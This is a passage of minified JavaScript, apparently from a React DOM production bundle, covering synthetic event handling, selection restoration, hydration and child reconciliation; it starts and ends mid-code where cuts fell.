",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},kn={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},jn={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function Nn(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):!!(e=jn[e])&&!!t[e]}function Sn(){return Nn}var Cn=M({},dn,{key:function(e){if(e.key){var t=wn[e.key]||e.key;if("Unidentified"!==t)return t}return"keypress"===e.type?13===(e=tn(e))?"Enter":String.fromCharCode(e):"keydown"===e.type||"keyup"===e.type?kn[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Sn,charCode:function(e){return"keypress"===e.type?tn(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?tn(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),An=an(Cn),Pn=an(M({},hn,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),Tn=an(M({},dn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Sn})),qn=an(M({},cn,{propertyName:0,elapsedTime:0,pseudoElement:0})),En=M({},hn,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Ln=an(En),Rn=[9,13,27,32],On=u&&"CompositionEvent"in window,Fn=null;u&&"documentMode"in document&&(Fn=document.documentMode);var In=u&&"TextEvent"in window&&!Fn,Mn=u&&(!On||Fn&&8<Fn&&11>=Fn),Dn=String.fromCharCode(32),_n=!1;function Bn(e,t){switch(e){case"keyup":return-1!==Rn.indexOf(t.keyCode);case"keydown":return 229!==t.keyCode;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function zn(e){return"object"===typeof(e=e.detail)&&"data"in e?e.data:null}var Wn=!1;var Hn={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Un(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return"input"===t?!!Hn[e.type]:"textarea"===t}function Vn(e,t,n,r){Ce(r),0<(t=$r(t,"onChange")).length&&(n=new un("onChange","change",null,n,r),e.push({event:n,listeners:t}))}var $n=null,Gn=null;function Qn(e){Dr(e,0)}function Kn(e){if(G(ba(e)))return e}function Yn(e,t){if("change"===e)return t}var Xn=!1;if(u){var Jn;if(u){var Zn="oninput"in document;if(!Zn){var er=document.createElement("div");er.setAttribute("oninput","return;"),Zn="function"===typeof er.oninput}Jn=Zn}else Jn=!1;Xn=Jn&&(!document.documentMode||9<document.documentMode)}function tr(){$n&&($n.detachEvent("onpropertychange",nr),Gn=$n=null)}function nr(e){if("value"===e.propertyName&&Kn(Gn)){var t=[];Vn(t,Gn,e,we(e)),Ee(Qn,t)}}function rr(e,t,n){"focusin"===e?(tr(),Gn=n,($n=t).attachEvent("onpropertychange",nr)):"focusout"===e&&tr()}function ar(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return Kn(Gn)}function ir(e,t){if("click"===e)return Kn(t)}function sr(e,t){if("input"===e||"change"===e)return Kn(t)}var or="function"===typeof Object.is?Object.is:function(e,t){return e===t&&(0!==e||1/e===1/t)||e!==e&&t!==t};function lr(e,t){if(or(e,t))return!0;if("object"!==typeof e||null===e||"object"!==typeof t||null===t)return!1;var n=Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++){var a=n[r];if(!d.call(t,a)||!or(e[a],t[a]))return!1}return!0}function cr(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function ur(e,t){var n,r=cr(e);for(e=0;r;){if(3===r.nodeType){if(n=e+r.textContent.length,e<=t&&n>=t)return{node:r,offset:t-e};e=n}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=cr(r)}}function dr(e,t){return!(!e||!t)&&(e===t||(!e||3!==e.nodeType)&&(t&&3===t.nodeType?dr(e,t.parentNode):"contains"in e?e.contains(t):!!e.compareDocumentPosition&&!!(16&e.compareDocumentPosition(t))))}function pr(){for(var e=window,t=Q();t instanceof e.HTMLIFrameElement;){try{var n="string"===typeof t.contentWindow.location.href}catch(r){n=!1}if(!n)break;t=Q((e=t.contentWindow).document)}return t}function hr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}function fr(e){var t=pr(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&dr(n.ownerDocument.documentElement,n)){if(null!==r&&hr(n))if(t=r.start,void 0===(e=r.end)&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if((e=(t=n.ownerDocument||document)&&t.defaultView||window).getSelection){e=e.getSelection();var a=n.textContent.length,i=Math.min(r.start,a);r=void 0===r.end?i:Math.min(r.end,a),!e.extend&&i>r&&(a=r,r=i,i=a),a=ur(n,i);var s=ur(n,r);a&&s&&(1!==e.rangeCount||e.anchorNode!==a.node||e.anchorOffset!==a.offset||e.focusNode!==s.node||e.focusOffset!==s.offset)&&((t=t.createRange()).setStart(a.node,a.offset),e.removeAllRanges(),i>r?(e.addRange(t),e.extend(s.node,s.offset)):(t.setEnd(s.node,s.offset),e.addRange(t)))}for(t=[],e=n;e=e.parentNode;)1===e.nodeType&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for("function"===typeof n.focus&&n.focus(),n=0;n<t.length;n++)(e=t[n]).element.scrollLeft=e.left,e.element.scrollTop=e.top}}var mr=u&&"documentMode"in document&&11>=document.documentMode,gr=null,yr=null,vr=null,xr=!1;function br(e,t,n){var r=n.window===n?n.document:9===n.nodeType?n:n.ownerDocument;xr||null==gr||gr!==Q(r)||("selectionStart"in(r=gr)&&hr(r)?r={start:r.selectionStart,end:r.selectionEnd}:r={anchorNode:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset},vr&&lr(vr,r)||(vr=r,0<(r=$r(yr,"onSelect")).length&&(t=new un("onSelect","select",null,t,n),e.push({event:t,listeners:r}),t.target=gr)))}function wr(e,t){var n={};return n[e.toLowerCase()]=t.toLowerCase(),n["Webkit"+e]="webkit"+t,n["Moz"+e]="moz"+t,n}var kr={animationend:wr("Animation","AnimationEnd"),animationiteration:wr("Animation","AnimationIteration"),animationstart:wr("Animation","AnimationStart"),transitionend:wr("Transition","TransitionEnd")},jr={},Nr={};function Sr(e){if(jr[e])return jr[e];if(!kr[e])return e;var t,n=kr[e];for(t in n)if(n.hasOwnProperty(t)&&t in Nr)return jr[e]=n[t];return e}u&&(Nr=document.createElement("div").style,"AnimationEvent"in window||(delete kr.animationend.animation,delete kr.animationiteration.animation,delete kr.animationstart.animation),"TransitionEvent"in window||delete kr.transitionend.transition);var Cr=Sr("animationend"),Ar=Sr("animationiteration"),Pr=Sr("animationstart"),Tr=Sr("transitionend"),qr=new Map,Er="abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");function Lr(e,t){qr.set(e,t),l(t,[e])}for(var Rr=0;Rr<Er.length;Rr++){var Or=Er[Rr];Lr(Or.toLowerCase(),"on"+(Or[0].toUpperCase()+Or.slice(1)))}Lr(Cr,"onAnimationEnd"),Lr(Ar,"onAnimationIteration"),Lr(Pr,"onAnimationStart"),Lr("dblclick","onDoubleClick"),Lr("focusin","onFocus"),Lr("focusout","onBlur"),Lr(Tr,"onTransitionEnd"),c("onMouseEnter",["mouseout","mouseover"]),c("onMouseLeave",["mouseout","mouseover"]),c("onPointerEnter",["pointerout","pointerover"]),c("onPointerLeave",["pointerout","pointerover"]),l("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),l("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),l("onBeforeInput",["compositionend","keypress","textInput","paste"]),l("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),l("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Fr="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),Ir=new Set("cancel close invalid load scroll toggle".split(" ").concat(Fr));function Mr(e,t,n){var r=e.type||"unknown-event";e.currentTarget=n,function(e,t,n,r,a,s,o,l,c){if(ze.apply(this,arguments),Ie){if(!Ie)throw Error(i(198));var u=Me;Ie=!1,Me=null,De||(De=!0,_e=u)}}(r,t,void 0,e),e.currentTarget=null}function Dr(e,t){t=0!==(4&t);for(var n=0;n<e.length;n++){var r=e[n],a=r.event;r=r.listeners;e:{var i=void 0;if(t)for(var s=r.length-1;0<=s;s--){var o=r[s],l=o.instance,c=o.currentTarget;if(o=o.listener,l!==i&&a.isPropagationStopped())break e;Mr(a,o,c),i=l}else for(s=0;s<r.length;s++){if(l=(o=r[s]).instance,c=o.currentTarget,o=o.listener,l!==i&&a.isPropagationStopped())break e;Mr(a,o,c),i=l}}}if(De)throw e=_e,De=!1,_e=null,e}function _r(e,t){var n=t[ma];void 0===n&&(n=t[ma]=new Set);var r=e+"__bubble";n.has(r)||(Hr(t,e,2,!1),n.add(r))}function Br(e,t,n){var r=0;t&&(r|=4),Hr(n,e,r,t)}var zr="_reactListening"+Math.random().toString(36).slice(2);function Wr(e){if(!e[zr]){e[zr]=!0,s.forEach(function(t){"selectionchange"!==t&&(Ir.has(t)||Br(t,!1,e),Br(t,!0,e))});var t=9===e.nodeType?e:e.ownerDocument;null===t||t[zr]||(t[zr]=!0,Br("selectionchange",!1,t))}}function Hr(e,t,n,r){switch(Yt(t)){case 1:var a=Vt;break;case 4:a=$t;break;default:a=Gt}n=a.bind(null,t,n,e),a=void 0,!Re||"touchstart"!==t&&"touchmove"!==t&&"wheel"!==t||(a=!0),r?void 0!==a?e.addEventListener(t,n,{capture:!0,passive:a}):e.addEventListener(t,n,!0):void 0!==a?e.addEventListener(t,n,{passive:a}):e.addEventListener(t,n,!1)}function Ur(e,t,n,r,a){var i=r;if(0===(1&t)&&0===(2&t)&&null!==r)e:for(;;){if(null===r)return;var s=r.tag;if(3===s||4===s){var o=r.stateNode.containerInfo;if(o===a||8===o.nodeType&&o.parentNode===a)break;if(4===s)for(s=r.return;null!==s;){var l=s.tag;if((3===l||4===l)&&((l=s.stateNode.containerInfo)===a||8===l.nodeType&&l.parentNode===a))return;s=s.return}for(;null!==o;){if(null===(s=va(o)))return;if(5===(l=s.tag)||6===l){r=i=s;continue e}o=o.parentNode}}r=r.return}Ee(function(){var r=i,a=we(n),s=[];e:{var o=qr.get(e);if(void 0!==o){var l=un,c=e;switch(e){case"keypress":if(0===tn(n))break e;case"keydown":case"keyup":l=An;break;case"focusin":c="focus",l=gn;break;case"focusout":c="blur",l=gn;break;case"beforeblur":case"afterblur":l=gn;break;case"click":if(2===n.button)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":l=fn;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":l=mn;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":l=Tn;break;case Cr:case Ar:case Pr:l=yn;break;case Tr:l=qn;break;case"scroll":l=pn;break;case"wheel":l=Ln;break;case"copy":case"cut":case"paste":l=xn;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":l=Pn}var u=0!==(4&t),d=!u&&"scroll"===e,p=u?null!==o?o+"Capture":null:o;u=[];for(var h,f=r;null!==f;){var m=(h=f).stateNode;if(5===h.tag&&null!==m&&(h=m,null!==p&&(null!=(m=Le(f,p))&&u.push(Vr(f,m,h)))),d)break;f=f.return}0<u.length&&(o=new l(o,c,null,n,a),s.push({event:o,listeners:u}))}}if(0===(7&t)){if(l="mouseout"===e||"pointerout"===e,(!(o="mouseover"===e||"pointerover"===e)||n===be||!(c=n.relatedTarget||n.fromElement)||!va(c)&&!c[fa])&&(l||o)&&(o=a.window===a?a:(o=a.ownerDocument)?o.defaultView||o.parentWindow:window,l?(l=r,null!==(c=(c=n.relatedTarget||n.toElement)?va(c):null)&&(c!==(d=We(c))||5!==c.tag&&6!==c.tag)&&(c=null)):(l=null,c=r),l!==c)){if(u=fn,m="onMouseLeave",p="onMouseEnter",f="mouse","pointerout"!==e&&"pointerover"!==e||(u=Pn,m="onPointerLeave",p="onPointerEnter",f="pointer"),d=null==l?o:ba(l),h=null==c?o:ba(c),(o=new u(m,f+"leave",l,n,a)).target=d,o.relatedTarget=h,m=null,va(a)===r&&((u=new u(p,f+"enter",c,n,a)).target=h,u.relatedTarget=d,m=u),d=m,l&&c)e:{for(p=c,f=0,h=u=l;h;h=Gr(h))f++;for(h=0,m=p;m;m=Gr(m))h++;for(;0<f-h;)u=Gr(u),f--;for(;0<h-f;)p=Gr(p),h--;for(;f--;){if(u===p||null!==p&&u===p.alternate)break e;u=Gr(u),p=Gr(p)}u=null}else u=null;null!==l&&Qr(s,o,l,u,!1),null!==c&&null!==d&&Qr(s,d,c,u,!0)}if("select"===(l=(o=r?ba(r):window).nodeName&&o.nodeName.toLowerCase())||"input"===l&&"file"===o.type)var g=Yn;else if(Un(o))if(Xn)g=sr;else{g=ar;var y=rr}else(l=o.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===o.type||"radio"===o.type)&&(g=ir);switch(g&&(g=g(e,r))?Vn(s,g,n,a):(y&&y(e,o,r),"focusout"===e&&(y=o._wrapperState)&&y.controlled&&"number"===o.type&&ee(o,"number",o.value)),y=r?ba(r):window,e){case"focusin":(Un(y)||"true"===y.contentEditable)&&(gr=y,yr=r,vr=null);break;case"focusout":vr=yr=gr=null;break;case"mousedown":xr=!0;break;case"contextmenu":case"mouseup":case"dragend":xr=!1,br(s,n,a);break;case"selectionchange":if(mr)break;case"keydown":case"keyup":br(s,n,a)}var v;if(On)e:{switch(e){case"compositionstart":var x="onCompositionStart";break e;case"compositionend":x="onCompositionEnd";break e;case"compositionupdate":x="onCompositionUpdate";break e}x=void 0}else Wn?Bn(e,n)&&(x="onCompositionEnd"):"keydown"===e&&229===n.keyCode&&(x="onCompositionStart");x&&(Mn&&"ko"!==n.locale&&(Wn||"onCompositionStart"!==x?"onCompositionEnd"===x&&Wn&&(v=en()):(Jt="value"in(Xt=a)?Xt.value:Xt.textContent,Wn=!0)),0<(y=$r(r,x)).length&&(x=new bn(x,e,null,n,a),s.push({event:x,listeners:y}),v?x.data=v:null!==(v=zn(n))&&(x.data=v))),(v=In?function(e,t){switch(e){case"compositionend":return zn(t);case"keypress":return 32!==t.which?null:(_n=!0,Dn);case"textInput":return(e=t.data)===Dn&&_n?null:e;default:return null}}(e,n):function(e,t){if(Wn)return"compositionend"===e||!On&&Bn(e,t)?(e=en(),Zt=Jt=Xt=null,Wn=!1,e):null;switch(e){case"paste":default:return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return Mn&&"ko"!==t.locale?null:t.data}}(e,n))&&(0<(r=$r(r,"onBeforeInput")).length&&(a=new bn("onBeforeInput","beforeinput",null,n,a),s.push({event:a,listeners:r}),a.data=v))}Dr(s,t)})}function Vr(e,t,n){return{instance:e,listener:t,currentTarget:n}}function $r(e,t){for(var n=t+"Capture",r=[];null!==e;){var a=e,i=a.stateNode;5===a.tag&&null!==i&&(a=i,null!=(i=Le(e,n))&&r.unshift(Vr(e,i,a)),null!=(i=Le(e,t))&&r.push(Vr(e,i,a))),e=e.return}return r}function Gr(e){if(null===e)return null;do{e=e.return}while(e&&5!==e.tag);return e||null}function Qr(e,t,n,r,a){for(var i=t._reactName,s=[];null!==n&&n!==r;){var o=n,l=o.alternate,c=o.stateNode;if(null!==l&&l===r)break;5===o.tag&&null!==c&&(o=c,a?null!=(l=Le(n,i))&&s.unshift(Vr(n,l,o)):a||null!=(l=Le(n,i))&&s.push(Vr(n,l,o))),n=n.return}0!==s.length&&e.push({event:t,listeners:s})}var Kr=/\r\n?/g,Yr=/\u0000|\uFFFD/g;function Xr(e){return("string"===typeof e?e:""+e).replace(Kr,"\n").replace(Yr,"")}function Jr(e,t,n){if(t=Xr(t),Xr(e)!==t&&n)throw Error(i(425))}function Zr(){}var ea=null,ta=null;function na(e,t){return"textarea"===e||"noscript"===e||"string"===typeof t.children||"number"===typeof t.children||"object"===typeof t.dangerouslySetInnerHTML&&null!==t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var ra="function"===typeof setTimeout?setTimeout:void 0,aa="function"===typeof clearTimeout?clearTimeout:void 0,ia="function"===typeof Promise?Promise:void 0,sa="function"===typeof queueMicrotask?queueMicrotask:"undefined"!==typeof ia?function(e){return ia.resolve(null).then(e).catch(oa)}:ra;function oa(e){setTimeout(function(){throw e})}function la(e,t){var n=t,r=0;do{var a=n.nextSibling;if(e.removeChild(n),a&&8===a.nodeType)if("/$"===(n=a.data)){if(0===r)return e.removeChild(a),void Wt(t);r--}else"$"!==n&&"$?"!==n&&"$!"!==n||r++;n=a}while(n);Wt(t)}function ca(e){for(;null!=e;e=e.nextSibling){var t=e.nodeType;if(1===t||3===t)break;if(8===t){if("$"===(t=e.data)||"$!"===t||"$?"===t)break;if("/$"===t)return null}}return e}function ua(e){e=e.previousSibling;for(var t=0;e;){if(8===e.nodeType){var n=e.data;if("$"===n||"$!"===n||"$?"===n){if(0===t)return e;t--}else"/$"===n&&t++}e=e.previousSibling}return null}var da=Math.random().toString(36).slice(2),pa="__reactFiber$"+da,ha="__reactProps$"+da,fa="__reactContainer$"+da,ma="__reactEvents$"+da,ga="__reactListeners$"+da,ya="__reactHandles$"+da;function va(e){var t=e[pa];if(t)return t;for(var n=e.parentNode;n;){if(t=n[fa]||n[pa]){if(n=t.alternate,null!==t.child||null!==n&&null!==n.child)for(e=ua(e);null!==e;){if(n=e[pa])return n;e=ua(e)}return t}n=(e=n).parentNode}return null}function xa(e){return!(e=e[pa]||e[fa])||5!==e.tag&&6!==e.tag&&13!==e.tag&&3!==e.tag?null:e}function ba(e){if(5===e.tag||6===e.tag)return e.stateNode;throw Error(i(33))}function wa(e){return e[ha]||null}var ka=[],ja=-1;function Na(e){return{current:e}}function Sa(e){0>ja||(e.current=ka[ja],ka[ja]=null,ja--)}function Ca(e,t){ja++,ka[ja]=e.current,e.current=t}var Aa={},Pa=Na(Aa),Ta=Na(!1),qa=Aa;function Ea(e,t){var n=e.type.contextTypes;if(!n)return Aa;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var a,i={};for(a in n)i[a]=t[a];return r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=i),i}function La(e){return null!==(e=e.childContextTypes)&&void 0!==e}function Ra(){Sa(Ta),Sa(Pa)}function Oa(e,t,n){if(Pa.current!==Aa)throw Error(i(168));Ca(Pa,t),Ca(Ta,n)}function Fa(e,t,n){var r=e.stateNode;if(t=t.childContextTypes,"function"!==typeof r.getChildContext)return n;for(var a in r=r.getChildContext())if(!(a in t))throw Error(i(108,H(e)||"Unknown",a));return M({},n,r)}function Ia(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Aa,qa=Pa.current,Ca(Pa,e),Ca(Ta,Ta.current),!0}function Ma(e,t,n){var r=e.stateNode;if(!r)throw Error(i(169));n?(e=Fa(e,t,qa),r.__reactInternalMemoizedMergedChildContext=e,Sa(Ta),Sa(Pa),Ca(Pa,e)):Sa(Ta),Ca(Ta,n)}var Da=null,_a=!1,Ba=!1;function za(e){null===Da?Da=[e]:Da.push(e)}function Wa(){if(!Ba&&null!==Da){Ba=!0;var e=0,t=xt;try{var n=Da;for(xt=1;e<n.length;e++){var r=n[e];do{r=r(!0)}while(null!==r)}Da=null,_a=!1}catch(a){throw null!==Da&&(Da=Da.slice(e+1)),Ge(Ze,Wa),a}finally{xt=t,Ba=!1}}return null}var Ha=[],Ua=0,Va=null,$a=0,Ga=[],Qa=0,Ka=null,Ya=1,Xa="";function Ja(e,t){Ha[Ua++]=$a,Ha[Ua++]=Va,Va=e,$a=t}function Za(e,t,n){Ga[Qa++]=Ya,Ga[Qa++]=Xa,Ga[Qa++]=Ka,Ka=e;var r=Ya;e=Xa;var a=32-st(r)-1;r&=~(1<<a),n+=1;var i=32-st(t)+a;if(30<i){var s=a-a%5;i=(r&(1<<s)-1).toString(32),r>>=s,a-=s,Ya=1<<32-st(t)+a|n<<a|r,Xa=i+e}else Ya=1<<i|n<<a|r,Xa=e}function ei(e){null!==e.return&&(Ja(e,1),Za(e,1,0))}function ti(e){for(;e===Va;)Va=Ha[--Ua],Ha[Ua]=null,$a=Ha[--Ua],Ha[Ua]=null;for(;e===Ka;)Ka=Ga[--Qa],Ga[Qa]=null,Xa=Ga[--Qa],Ga[Qa]=null,Ya=Ga[--Qa],Ga[Qa]=null}var ni=null,ri=null,ai=!1,ii=null;function si(e,t){var n=qc(5,null,null,0);n.elementType="DELETED",n.stateNode=t,n.return=e,null===(t=e.deletions)?(e.deletions=[n],e.flags|=16):t.push(n)}function oi(e,t){switch(e.tag){case 5:var n=e.type;return null!==(t=1!==t.nodeType||n.toLowerCase()!==t.nodeName.toLowerCase()?null:t)&&(e.stateNode=t,ni=e,ri=ca(t.firstChild),!0);case 6:return null!==(t=""===e.pendingProps||3!==t.nodeType?null:t)&&(e.stateNode=t,ni=e,ri=null,!0);case 13:return null!==(t=8!==t.nodeType?null:t)&&(n=null!==Ka?{id:Ya,overflow:Xa}:null,e.memoizedState={dehydrated:t,treeContext:n,retryLane:1073741824},(n=qc(18,null,null,0)).stateNode=t,n.return=e,e.child=n,ni=e,ri=null,!0);default:return!1}}function li(e){return 0!==(1&e.mode)&&0===(128&e.flags)}function ci(e){if(ai){var t=ri;if(t){var n=t;if(!oi(e,t)){if(li(e))throw Error(i(418));t=ca(n.nextSibling);var r=ni;t&&oi(e,t)?si(r,n):(e.flags=-4097&e.flags|2,ai=!1,ni=e)}}else{if(li(e))throw Error(i(418));e.flags=-4097&e.flags|2,ai=!1,ni=e}}}function ui(e){for(e=e.return;null!==e&&5!==e.tag&&3!==e.tag&&13!==e.tag;)e=e.return;ni=e}function di(e){if(e!==ni)return!1;if(!ai)return ui(e),ai=!0,!1;var t;if((t=3!==e.tag)&&!(t=5!==e.tag)&&(t="head"!==(t=e.type)&&"body"!==t&&!na(e.type,e.memoizedProps)),t&&(t=ri)){if(li(e))throw pi(),Error(i(418));for(;t;)si(e,t),t=ca(t.nextSibling)}if(ui(e),13===e.tag){if(!(e=null!==(e=e.memoizedState)?e.dehydrated:null))throw Error(i(317));e:{for(e=e.nextSibling,t=0;e;){if(8===e.nodeType){var n=e.data;if("/$"===n){if(0===t){ri=ca(e.nextSibling);break e}t--}else"$"!==n&&"$!"!==n&&"$?"!==n||t++}e=e.nextSibling}ri=null}}else ri=ni?ca(e.stateNode.nextSibling):null;return!0}function pi(){for(var e=ri;e;)e=ca(e.nextSibling)}function hi(){ri=ni=null,ai=!1}function fi(e){null===ii?ii=[e]:ii.push(e)}var mi=b.ReactCurrentBatchConfig;function gi(e,t,n){if(null!==(e=n.ref)&&"function"!==typeof e&&"object"!==typeof e){if(n._owner){if(n=n._owner){if(1!==n.tag)throw Error(i(309));var r=n.stateNode}if(!r)throw Error(i(147,e));var a=r,s=""+e;return null!==t&&null!==t.ref&&"function"===typeof t.ref&&t.ref._stringRef===s?t.ref:(t=function(e){var t=a.refs;null===e?delete t[s]:t[s]=e},t._stringRef=s,t)}if("string"!==typeof e)throw Error(i(284));if(!n._owner)throw Error(i(290,e))}return e}function yi(e,t){throw e=Object.prototype.toString.call(t),Error(i(31,"[object Object]"===e?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function vi(e){return(0,e._init)(e._payload)}function xi(e){function t(t,n){if(e){var r=t.deletions;null===r?(t.deletions=[n],t.flags|=16):r.push(n)}}function n(n,r){if(!e)return null;for(;null!==r;)t(n,r),r=r.sibling;return null}function r(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function a(e,t){return(e=Lc(e,t)).index=0,e.sibling=null,e}function s(t,n,r){return t.index=r,e?null!==(r=t.alternate)?(r=r.index)<n?(t.flags|=2,n):r:(t.flags|=2,n):(t.flags|=1048576,n)}function o(t){return e&&null===t.alternate&&(t.flags|=2),t}function l(e,t,n,r){return null===t||6!==t.tag?((t=Ic(n,e.mode,r)).return=e,t):((t=a(t,n)).return=e,t)}function c(e,t,n,r){var i=n.type;return i===j?d(e,t,n.props.children,r,n.key):null!==t&&(t.elementType===i||"object"===typeof i&&null!==i&&i.$$typeof===L&&vi(i)===t.type)?((r=a(t,n.props)).ref=gi(e,t,n),r.return=e,r):((r=Rc(n.type,n.key,n.props,null,e.mode,r)).ref=gi(e,t,n),r.return=e,r)}function u(e,t,n,r){return null===t||4!==t.tag||t.stateNode.containerInfo!==n.containerInfo||t.stateNode.implementation!==n.implementation?((t=Mc(n,e.mode,r)).return=e,t):((t=a(t,n.children||[])).return=e,t)}function d(e,t,n,r,i){return null===t||7!==t.tag?((t=Oc(n,e.mode,r,i)).return=e,t):((t=a(t,n)).return=e,t)}function p(e,t,n){if("string"===typeof t&&""!==t||"number"===typeof t)return(t=Ic(""+t,e.mode,n)).return=e,t;if("object"===typeof t&&null!==t){switch(t.$$typeof){case w:return(n=Rc(t.type,t.key,t.props,null,e.mode,n)).ref=gi(e,null,t),n.return=e,n;case k:return(t=Mc(t,e.mode,n)).return=e,t;case L:return p(e,(0,t._init)(t._payload),n)}if(te(t)||F(t))return(t=Oc(t,e.mode,n,null)).return=e,t;yi(e,t)}return null}function h(e,t,n,r){var a=null!==t?t.key:null;if("string"===typeof n&&""!==n||"number"===typeof n)return null!==a?null:l(e,t,""+n,r);if("object"===typeof n&&null!==n){switch(n.$$typeof){case w:return n.key===a?c(e,t,n,r):null;case k:return n.key===a?u(e,t,n,r):null;case L:return h(e,t,(a=n._init)(n._payload),r)}if(te(n)||F(n))return null!==a?null:d(e,t,n,r,null);yi(e,n)}return null}function f(e,t,n,r,a){if("string"===typeof r&&""!==r||"number"===typeof r)return l(t,e=e.get(n)||null,""+r,a);if("object"===typeof r&&null!==r){switch(r.$$typeof){case w:return c(t,e=e.get(null===r.key?n:r.key)||null,r,a);case k:return u(t,e=e.get(null===r.key?n:r.key)||null,r,a);case L:return f(e,t,n,(0,r._init)(r._payload),a)}if(te(r)||F(r))return d(t,e=e.get(n)||null,r,a,null);yi(t,r)}return null}function m(a,i,o,l){for(var c=null,u=null,d=i,m=i=0,g=null;null!==d&&m<o.length;m++){d.index>m?(g=d,d=null):g=d.sibling;var y=h(a,d,o[m],l);if(null===y){null===d&&(d=g);break}e&&d&&null===y.alternate&&t(a,d),i=s(y,i,m),null===u?c=y:u.sibling=y,u=y,d=g}if(m===o.length)return n(a,d),ai&&Ja(a,m),c;if(null===d){for(;m<o.length;m++)null!==(d=p(a,o[m],l))&&(i=s(d,i,m),null===u?c=d:u.sibling=d,u=d);return ai&&Ja(a,m),c}for(d=r(a,d);m<o.length;m++)null!==(g=f(d,a,m,o[m],l))&&(e&&null!==g.alternate&&d.delete(null===g.key?m:g.key),i=s(g,i,m),null===u?c=g:u.sibling=g,u=g);return e&&d.forEach(function(e){return t(a,e)}),ai&&Ja(a,m),c}function g(a,o,l,c){var u=F(l);if("function"!==typeof u)throw Error(i(150));if(null==(l=u.call(l)))throw Error(i(151));for(var d=u=null,m=o,g=o=0,y=null,v=l.next();null!==m&&!v.done;g++,v=l.next()){m.index>g?(y=m,m=null):y=m.sibling;var 